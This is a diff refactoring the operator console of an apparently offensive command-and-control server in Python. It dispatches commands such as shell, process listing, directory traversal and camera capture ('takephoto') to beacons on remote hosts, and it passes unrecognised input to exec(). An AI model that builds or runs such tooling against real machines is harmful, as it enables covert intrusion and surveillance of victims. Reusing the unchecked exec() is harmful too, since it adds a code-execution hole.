@@ -5,9 +5,9 @@ connection and address variables fed in from the specified socket.
 this allows for multiple connections to be interacted with.
 """
 
-from .sessions_commands import SessionCommandsClass
+from .sessions_commands import Session
 from ServerDatabase.database import DatabaseClass
-from .beacon_commands import BeaconCommandsClass
+from .beacon import Beacon, add_beacon_command_list, remove_beacon_list
 from .global_objects import (
     remove_connection_list,
     sessions_list,
@@ -16,8 +16,6 @@ from .global_objects import (
     config,
     tab_completion,
     beacon_list,
-    remove_beacon_list,
-    add_beacon_command_list
 )
 
 from typing import Tuple
@@ -30,6 +28,7 @@ import socket
 import readline
 import ssl
 import time
+import traceback
 
 
 class MultiHandlerCommands:
@@ -38,9 +37,7 @@ class MultiHandlerCommands:
     can call the class and have access to the commands
     """
     def __init__(self) -> None:
-        self.sessioncommands = SessionCommandsClass()
-        self.beaconCommands = BeaconCommandsClass()
-        self.database = DatabaseClass()
+        self.database = DatabaseClass(config)
         colorama.init(autoreset=True)
         return
 
@@ -59,7 +56,8 @@ class MultiHandlerCommands:
         def handle_beacon():
             for userID, session in beacon_list.items():
                 if session.uuid == user_ID:
-                    self.sessioncommands.change_beacon(
+                    beaconClass = beacon_list[userID]
+                    beaconClass.sessioncommands.change_beacon(
                         conn, r_address, session.uuid)
             return
 
@@ -133,29 +131,36 @@ class MultiHandlerCommands:
         'sysinfo', 'close', 'checkfiles', 'download', 'upload', 'services',
         'netstat', 'diskusage', 'listdir', directoryTraversal', 'takePhoto'])
         """
+        
+        beaconClass = beacon_list.get(UserID)
+        if beaconClass:
+            print(colorama.Fore.YELLOW +
+                  f"Beacon {beaconClass.hostname} ({beaconClass.uuid}) ")
+        else:
+            print(f"No beacon found with UUID: {UserID}")
+                    
         def handle_session():
-            if beacon_list["uuid"]:
-                print(colorama.Fore.GREEN +
-                      "Beacon will change to session mode" +
-                      " after the next callback")
-                add_beacon_command_list(UserID, "session")
-                remove_beacon_list(beacon_list["uuid"])
+            print(colorama.Fore.GREEN +
+                  "Beacon will change to session mode" +
+                  " after the next callback")
+            add_beacon_command_list(UserID, None, "session", None)
+            remove_beacon_list(beaconClass.uuid)
             return
-
+ 
         command_handlers = {
-            "shell": lambda: self.beaconCommands.shell(UserID, IPAddress),
-            "listdir": lambda: self.beaconCommands.list_dir(UserID, IPAddress),
-            "close": lambda: self.beaconCommands.close_connection(UserID),
-            "processes": lambda: self.beaconCommands.list_processes(UserID),
-            "sysinfo": lambda: self.beaconCommands.systeminfo(UserID),
-            "diskusage": lambda: self.beaconCommands.disk_usage(UserID),
-            "netstat": lambda: self.beaconCommands.netstat(UserID),
+            "shell": lambda: beaconClass.shell(UserID, IPAddress),
+            "listdir": lambda: beaconClass.list_dir(UserID, IPAddress),
+            "close": lambda: beaconClass.close_connection(UserID),
+            "processes": lambda: beaconClass.list_processes(UserID),
+            "sysinfo": lambda: beaconClass.systeminfo(UserID),
+            "diskusage": lambda: beaconClass.disk_usage(UserID),
+            "netstat": lambda: beaconClass.netstat(UserID),
             "session": handle_session,
-            "commands": lambda: self.beaconCommands.list_db_commands(UserID),
-            "directorytraversal": lambda: self.beaconCommands.dir_traversal(
+            "commands": lambda: beaconClass.list_db_commands(UserID),
+            "directorytraversal": lambda: beaconClass.dir_traversal(
                 UserID),
-            "takephoto": lambda: self.beaconCommands.takePhoto(UserID)
-            "listFiles": lambda: self.beaconCommands.list_files(UserID),
+            "takephoto": lambda: beaconClass.takePhoto(UserID),
+            "listFiles": lambda: beaconClass.list_files(UserID),
         }
 
         while True:
@@ -173,17 +178,20 @@ class MultiHandlerCommands:
                              f"{UserID} Command: ").lower())
             if command == "exit":  # exits back to multihandler menu
                 break
-            try:  # calls command
+            try:  
                 handler = command_handlers.get(command)
                 if handler:
                     handler()
-                    if command == "close":
+                    if command == "close" or command == "session":
                         return
                 else:
                     if not exec(command):
                         print((colorama.Fore.GREEN + "NEED TO ADD HELP MENU"))
-            except (KeyError, SyntaxError, AttributeError) as e:
-                print(colorama.Fore.RED + str(e) + "Error HERE")
+            except (KeyError, SyntaxError, AttributeError, NameError):
+                if not config['server']['quiet_mode']:
+                    print(colorama.Fore.RED + "Traceback:")
+                    traceback.print_exc()
+                
         return
 
     def listconnections(self) -> None:
